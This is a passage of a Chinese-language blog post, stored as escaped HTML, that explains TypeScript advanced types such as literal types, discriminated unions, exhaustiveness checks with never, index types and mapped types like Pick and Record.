ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">assertNever</span>(<span class=\"params\">x: never</span>): <span class=\"title\">never</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Unexpected object: \"</span> + x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> assertNever(s); <span class=\"comment\">// error，忘记的那个 case 类型将被 assertNever 标记为 never 类型，并抛出错误</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>assertNever</code> 检查 <code>s</code> 是否为 <code>never</code> 类型—-即为除去所有可能情况后剩下的类型。 如果你忘记了某个 <code>case</code>，那么 <code>s</code> 将具有一个真实的类型并且你会得到一个错误。</p>\n<h3 id=\"多态的-this-类型\"><a href=\"#多态的-this-类型\" class=\"headerlink\" title=\"多态的 this 类型\"></a>多态的 this 类型</h3><p>不多解释。</p>\n<h3 id=\"索引类型-Index-types\"><a href=\"#索引类型-Index-types\" class=\"headerlink\" title=\"索引类型(Index types)\"></a>索引类型(Index types)</h3><p>使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的 <code>javaScript</code> 模式是从对象中选取属性的子集。</p>\n<p>下面是如何在 <code>TypeScript</code> 里使用此函数，通过 <code>索引类型查询</code> 和 <code>索引访问</code> 操作符：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// keyof 索引类型查询操作符，类似与 javascript 中的 for in 遍历中的取 key 操作</span></span><br><span class=\"line\"><span class=\"comment\">// T[K] 索引访问操作符，T[K][] 这里表示 取值后的类型，就是返回的类型</span></span><br><span class=\"line\"><span class=\"comment\">// pluck(person, ['name']) -&gt; T[k][] -&gt; 'Jarid'[] -&gt; string[]</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pluck</span>&lt;<span class=\"title\">T</span>, <span class=\"title\">K</span> <span class=\"title\">extends</span> <span class=\"title\">keyof</span> <span class=\"title\">T</span>&gt;(<span class=\"params\">o: T, names: K[]</span>): <span class=\"title\">T</span>[<span class=\"title\">K</span>][] </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> names.map(<span class=\"function\"><span class=\"params\">n</span> =&gt;</span> o[n]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Person &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    age: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> person: Person = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">'Jarid'</span>,</span><br><span class=\"line\">    age: <span class=\"number\">35</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strings: <span class=\"built_in\">string</span>[] = pluck(person, [<span class=\"string\">'name'</span>]);<span class=\"comment\">// -&gt; return ['Jarid']</span></span><br></pre></td></tr></table></figure>\n<p>编译器会检查 <code>name</code> 是否真的是 <code>Person</code> 的一个属性。 本例还引入了几个新的类型操作符。 首先是 <code>keyof T</code>， 索引类型查询操作符。 对于任何类型 <code>T</code>， <code>keyof T</code>的结果为 <code>T</code> 上已知的公共属性名的联合。例如：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> props: keyof Person;  </span><br><span class=\"line\"><span class=\"comment\">// -&gt; name | age</span></span><br><span class=\"line\"><span class=\"comment\">// keyof Person是完全可以与 'name' | 'age'互相替换的</span></span><br></pre></td></tr></table></figure>\n<p>第二个操作符是 <code>T[K]</code>， 索引访问操作符。在这里，类型语法反映了表达式语法。 这意味着 <code>person[&#39;name&#39;]</code> 具有类型 <code>Person[&#39;name&#39;]</code> —- 在我们的例子里则为 <code>string</code> 类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用 <code>T[K]</code>，这正是它的强大所在。 你只要确保类型变量 <code>K extends keyof T</code> 就可以了。</p>\n<h4 id=\"索引类型和字符串索引签名\"><a href=\"#索引类型和字符串索引签名\" class=\"headerlink\" title=\"索引类型和字符串索引签名\"></a>索引类型和字符串索引签名</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Map&lt;T&gt; &#123;</span><br><span class=\"line\">    [key: <span class=\"built_in\">string</span>]: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Map 是一个只包含一对键值的对象 key -&gt; string，value -&gt; T</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> keys: keyof Map&lt;<span class=\"built_in\">number</span>&gt;; <span class=\"comment\">// string</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> value: Map&lt;<span class=\"built_in\">number</span>&gt;[<span class=\"string\">'foo'</span>]; <span class=\"comment\">// number</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"映射类型\"><a href=\"#映射类型\" class=\"headerlink\" title=\"映射类型\"></a>映射类型</h3><p>通过 <code>映射类型</code> 将一个已知的类型每个属性都变为可选的/只读的。在映射类型里，新类型以相同的形式去转换旧类型里每个属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 转换成只读属性</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class=\"line\">    readonly [P <span class=\"keyword\">in</span> keyof T]: T[P];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 转换成可选属性</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> Partial&lt;T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T]?: T[P];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用方式：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> PersonPartial = Partial&lt;Person&gt;;</span><br><span class=\"line\"><span class=\"keyword\">type</span> ReadonlyPerson = Readonly&lt;Person&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 假设Person interface Person = &#123;age: number; gender: string; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class=\"line\">    readonly [P <span class=\"keyword\">in</span> keyof T]: T[P];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// T -&gt; Person</span></span><br><span class=\"line\"><span class=\"comment\">// P in keyof T -&gt; keyof T 指的是 Person 中所有的 key</span></span><br><span class=\"line\"><span class=\"comment\">// P in keyof T -&gt; P 为 age &amp; gender &amp; name</span></span><br><span class=\"line\"><span class=\"comment\">// T[P] 取值操作</span></span><br></pre></td></tr></table></figure>\n<p>再看一个<code>包装属性</code>的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Proxy&lt;T&gt; = &#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span>(): T;</span><br><span class=\"line\">    <span class=\"keyword\">set</span>(value: T): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">type</span> Proxify&lt;T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T]: Proxy&lt;T[P]&gt;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">proxify</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">o: T</span>): <span class=\"title\">Proxify</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> proxyProps = proxify(props);</span><br></pre></td></tr></table></figure>\n<p>是不是有种函数互相嵌套的感觉？</p>\n<p><strong><code>Pick</code></strong><br>取出指定的属性。</p>\n<p>定义：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Pick&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> K]: T[P];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我们用上面的Person来使用：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> PickPerson = Pick&lt;Person, <span class=\"string\">'age'</span> | <span class=\"string\">'name'</span>&gt;; <span class=\"comment\">// -&gt; &#123;age: number; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// T: Person, K: 'age' | 'name',  T: 'age' | 'gender' | 'age', P: 'age' | 'name',</span></span><br><span class=\"line\"><span class=\"comment\">// [P in K] 遍历 K</span></span><br><span class=\"line\"><span class=\"comment\">// T[P] 取值</span></span><br></pre></td></tr></table></figure></p>\n<p><strong><code>Record</code></strong><br>将传入的属性统一定义类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Record&lt;K <span class=\"keyword\">extends</span> <span class=\"built_in\">string</span>, T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> K]: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> RecordPerson = Record&lt;<span class=\"string\">'gender'</span> | <span class=\"string\">'name'</span>, <span class=\"built_in\">string</span>&gt;; <span class=\"comment\">// -&gt; &#123;gender: string; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// K: 'gender' | 'name', T: string</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"由映射类型进行推断\"><a href=\"#由映射类型进行推断\" class=\"headerlink\" title=\"由映射类型进行推断\"></a>由映射类型进行推断</h4><p>上面是包装属性，下面看下如何拆包。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unproxify</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">t: Proxify&lt;T&gt;</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = &#123;&#125; <span class=\"keyword\">as</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> k <span class=\"keyword\">in</span> t) &#123;</span><br><span class=\"line\">        result[k] = t[k].get();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br>","more":"</p>\n<h3 id=\"字符串字面量类型\"><a href=\"#字符串字面量类型\" class=\"headerlink\" title=\"字符串字面量类型\"></a>字符串字面量类型</h3><p>字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型保护和类型别名很好的配合。</p>\n<p>这里直接使用官方的例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Easing = <span class=\"string\">\"ease-in\"</span> | <span class=\"string\">\"ease-out\"</span> | <span class=\"string\">\"ease-in-out\"</span>; <span class=\"comment\">// 使用 type 重命名 联合类型</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> UIElement &#123;</span><br><span class=\"line\">    animate(dx: <span class=\"built_in\">number</span>, dy: <span class=\"built_in\">number</span>, easing: Easing) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-in\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-out\"</span>) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-in-out\"</span>) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// error，没传 easing</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> button = <span class=\"keyword\">new</span> UIElement();</span><br><span class=\"line\">button.animate(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"string\">\"ease-in\"</span>);</span><br><span class=\"line\">button.animate(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"string\">\"uneasy\"</span>); <span class=\"comment\">// error，没有 uneasy 类型</span></span><br></pre></td></tr></table></figure></p>\n<p>字符串字面量类型还可以用于区分函数重载：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: \"img\"</span>): <span class=\"title\">HTMLImageElement</span></span>; <span class=\"comment\">// img 标签</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: \"input\"</span>): <span class=\"title\">HTMLInputElement</span></span>; <span class=\"comment\">// input 标签</span></span><br><span class=\"line\"><span class=\"comment\">// ... </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: <span class=\"built_in\">string</span></span>): <span class=\"title\">Element</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ... </span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数字字面量类型\"><a href=\"#数字字面量类型\" class=\"headerlink\" title=\"数字字面量类型\"></a>数字字面量类型</h3><p>TypeScript还具有数字字面量类型。不过数字字面量类型很少使用，因为它不能像字符串字面量表达一个具有意义的值。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rollDie</span>(<span class=\"params\"></span>): 1 | 2 | 3 | 4 | 5 | 6 </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"枚举成员类型\"><a href=\"#枚举成员类型\" class=\"headerlink\" title=\"枚举成员类型\"></a>枚举成员类型</h3><p>在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。</p>\n<h3 id=\"可辨识联合（Discriminated-Unions）\"><a href=\"#可辨识联合（Discriminated-Unions）\" class=\"headerlink\" title=\"可辨识联合（Discriminated Unions）\"></a>可辨识联合（Discriminated Unions）</h3><p>你可以合并 <code>单例类型</code>，<code>联合类型</code>，<code>类型保护</code> 和 <code>类型别名</code> 来创建一个叫做 <code>可辨识联合的高级模式</code>，它也称做 <code>标签联合</code> 或 <code>代数数据类型</code>。 可辨识联合在函数式编程很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：</p>\n<ol>\n<li>具有普通的单例类型属性— <code>可辨识的特征</code>。</li>\n<li>一个类型别名包含了那些类型的联合— 联合。</li>\n<li>此属性上的类型保护。</li>\n</ol>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Square &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"square\"</span>;</span><br><span class=\"line\">    size: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Rectangle &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"rectangle\"</span>;</span><br><span class=\"line\">    width: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    height: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Circle &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"circle\"</span>;</span><br><span class=\"line\">    radius: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>每个接口都有 <code>kind</code> 属性但有不同的字符串字面量类型。 <code>kind</code> 属性称做 <code>可辨识的特征</code> 或 <code>标签</code>。<br>将上面三个接口联合：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Shap = Square | Rectangle | Circle;</span><br></pre></td></tr></table></figure>\n<p>使用可辨识联合：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现了吗？这种写法估计大家都不会陌生，只是为这种形式起了一个合理化的名字罢了。</p>\n<h4 id=\"完整性检查\"><a href=\"#完整性检查\" class=\"headerlink\" title=\"完整性检查\"></a>完整性检查</h4><p>当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了 <code>Triangle</code> 到 <code>Shape</code>，我们同时还需要更新 <code>area</code>:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Shap = Square | Rectangle | Circle | Triangle;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 这会出错，因为没有一个 Triangle 类型</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解决方法一：<br>使用 <code>--strictNullChecks</code> 并且指定一个返回值类型;</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>): <span class=\"title\">number</span> </span>&#123; <span class=\"comment\">// error: returns number | undefined</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>因为 <code>switch</code> 没有包涵所有情况，所以 <code>TypeScript</code> 认为这个函数有时候会返回 <code>undefined</code>。 如果你明确地指定了返回值类型为 <code>number</code>，那么你会看到一个错误，因为实际上返回值的类型为 <code>number | undefined</code>。</p>\n<p>解决方法二：<br>使用 <code>never</code> 类型，编译器用它来进行完整性检查。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">assertNever</span>(<span class=\"params\">x: never</span>): <span class=\"title\">never</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Unexpected object: \"</span> + x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> assertNever(s); <span class=\"comment\">// error，忘记的那个 case 类型将被 assertNever 标记为 never 类型，并抛出错误</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>assertNever</code> 检查 <code>s</code> 是否为 <code>never</code> 类型—-即为除去所有可能情况后剩下的类型。 如果你忘记了某个 <code>case</code>，那么 <code>s</code> 将具有一个真实的类型并且你会得到一个错误。</p>\n<h3 id=\"多态的-this-类型\"><a href=\"#多态的-this-类型\" class=\"headerlink\" title=\"多态的 this 类型\"></a>多态的 this 类型</h3><p>不多解释。</p>\n<h3 id=\"索引类型-Index-types\"><a href=\"#索引类型-Index-types\" class=\"headerlink\" title=\"索引类型(Index types)\"></a>索引类型(Index types)</h3><p>使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的 <code>javaScript</code> 模式是从对象中选取属性的子集。</p>\n<p>下面是如何在 <code>TypeScript</code> 里使用此函数，通过 <code>索引类型查询</code> 和 <code>索引访问</code> 操作符：</p>\n<figure class=\"highlight 